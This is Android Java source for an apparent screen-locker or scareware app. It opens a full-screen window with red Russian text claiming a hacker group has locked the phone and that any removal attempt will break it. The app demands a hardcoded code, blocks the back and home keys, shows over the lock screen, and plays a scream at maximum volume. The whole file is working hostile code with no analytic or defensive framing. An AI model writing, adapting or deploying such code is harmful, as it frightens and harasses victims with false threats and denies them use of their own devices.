package com.pidori.locker;

import android.app.Activity;
import android.content.Context;
import android.graphics.Color;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    private MediaPlayer player;
    private EditText passInput;
    private TextView errorText;
    private int attempts = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setPadding(50, 50, 50, 50);
        layout.setGravity(android.view.Gravity.CENTER);

        TextView tv = new TextView(this);
        tv.setText("ТВОЙ ТЕЛЕФОН ЗАБЛОКИРОВАН\nХАКЕРСКОЙ ГРУППОЙ PIDORI\n\nЛюбая попытка снять ограничение\nприведёт к поломке телефона.\n\nВведите пароль:");
        tv.setTextColor(Color.RED);
        tv.setTextSize(22f);
        tv.setGravity(android.view.Gravity.CENTER);
        layout.addView(tv);

        passInput = new EditText(this);
        passInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        passInput.setTextColor(Color.RED);
        passInput.setHint("Код");
        passInput.setGravity(android.view.Gravity.CENTER);
        layout.addView(passInput);

        errorText = new TextView(this);
        errorText.setTextColor(Color.YELLOW);
        errorText.setGravity(android.view.Gravity.CENTER);
        layout.addView(errorText);

        Button btn = new Button(this);
        btn.setText("ENTER");
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (passInput.getText().toString().equals("755")) {
                    finish();
                } else {
                    attempts++;
                    if (attempts >= 5) {
                        errorText.setText("ПОПЫТКИ КОНЧИЛИСЬ!");
                        playSound(); 
                        attempts = 0;
                    } else {
                        errorText.setText("НЕВЕРНО! Осталось: " + (5 - attempts));
                    }
                }
            }
        });
        layout.addView(btn);

        setContentView(layout);
        playSound();
    }

    private void playSound() {
        try {
            if (player != null) { 
                if (player.isPlaying()) player.stop();
                player.release(); 
            }
            player = MediaPlayer.create(this, R.raw.scream);
            if (player != null) {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                player.start();
                new Handler().postDelayed(new Runnable() {
                    public void run() { 
                        if (player != null && player.isPlaying()) { 
                            player.stop(); 
                        } 
                    }
                }, 10000);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (player != null) {
            if (player.isPlaying()) player.stop();
            player.release();
            player = null;
        }
    }
}
